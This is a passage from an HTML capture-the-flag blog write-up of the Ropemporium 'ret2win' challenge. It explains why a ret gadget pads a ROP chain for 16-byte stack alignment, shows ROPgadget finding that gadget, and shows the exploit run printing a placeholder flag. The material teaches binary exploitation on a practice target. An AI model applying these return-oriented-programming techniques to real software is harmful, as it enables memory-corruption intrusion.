</pre></table></code></div></div><p>Now hold on, what is this <code class="language-plaintext highlighter-rouge">ret_gadget</code> in the script? Why is it used? I would recommend that you read the <a href="https://ropemporium.com/guide.html#Common%20pitfalls">common pitfalls</a> section of <code class="language-plaintext highlighter-rouge">ropemporium</code>, but in short the stack needs to be 16-byte aligned for x86-64 binaries before calling GLIBC functions. One way to accomplish this is to pad our exploit string with a <code class="language-plaintext highlighter-rouge">ret</code> gadget before returning into a function.</p><p><code class="language-plaintext highlighter-rouge">ROPgadget</code> can be used to find this ret instruction:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">(ROPgadget)&gt;</span><span class="w"> </span>binary ret2win
<span class="go">[+] Binary loaded
</span><span class="gp">(ROPgadget)&gt;</span><span class="w"> </span>load
<span class="go">[+] Loading gadgets, please wait...
[+] Gadgets loaded !
</span><span class="gp">(ROPgadget)&gt;</span><span class="w"> </span>search ret
<span class="go">---SNIP---
0x000000000040053e : ret
---SNIP---
</span></pre></table></code></div></div><p>Now, if we run the script we should print the flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="gp">bitis@Workstation ~/c/r/ret2win&gt;</span><span class="w"> </span>python win.py
<span class="go">[*] '/home/bitis/ctf/ropemporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
ret2win() address: 0x400756
[+] Starting local process '/home/bitis/ctf/ropemporium/ret2win/ret2win': pid 3960
[*] Switching to interactive mode
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Process '/home/bitis/ctf/ropemporium/ret2win/ret2win' stopped with exit code 0 (pid 3960)
[*] Got EOF while reading in interactive
</span></pre></table></code></div></div><p>And we just solved our first pwn challenge! If you aren’t that comfortable reading assembly yet, you can also try to use <code class="language-plaintext highlighter-rouge">Ghidra</code>, however I won’t get into that in this post. In my next post I’ll go through the “split” challenge from Ropemporium, in which we’ll have to search the binary for useful strings.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/ropemporium/'>RopEmporium</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ropemporium/" class="post-tag no-text-decoration" >ropemporium</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Ret2win writeup - BitisGabonica&amp;url=https://bitisg.github.io/posts/Ret2win/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Ret2win writeup - BitisGabonica&amp;u=https://bitisg.github.io/posts/Ret2win/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://bitisg.github.io/posts/Ret2win/&amp;text=Ret2win writeup - BitisGabonica" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DroidComp/">DroidComp writeup</a><li><a href="/posts/Faculty/">Faculty writeup</a><li><a href="/posts/Trick/">Trick writeup</a><li><a href="/posts/Seal/">Seal writeup</a><li><a href="/posts/Devzat/">Devzat writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Unicode/"><div class="card-body"> <em class="timeago small" data-ts="1658062800" > 2022-07-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Unicode writeup</h3><div class="text-muted small"><p> Summary This box focuses on exploiting an authentication system using a jwt with an insecure jku parameter. After this, we can do unicode normalization to gain lfi, which will allow us to get a pas...</p></div></div></a></div><div class="card"> <a href="/posts/Panda/"><div class="card-body"> <em class="timeago small" data-ts="1658322000" > 2022-07-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>RedPanda writeup</h3><div class="text-muted small"><p> Summary This was actually a pretty tricky box. It starts out with thymeleaf template injection, and ends with a slightly complicated XXE attack to gain root access. Let’s take a look! Foothold We ...</p></div></div></a></div><div class="card"> <a href="/posts/Faculty/"><div class="card-body"> <em class="timeago small" data-ts="1659877200" > 2022-08-07 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Faculty writeup</h3><div class="text-muted small"><p> Summary Foothold We start out by doing an nmap port scan: ┌──(bitis㉿workstation)-[~/Downloads] └─$ nmap -sC -sV 10.129.227.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-08 20:15 CEST Nma...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Ambassador/" class="btn btn-outline-primary" prompt="Older"><p>Ambassador writeup</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4RZWBJKYF3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4RZWBJKYF3'); }); </script>
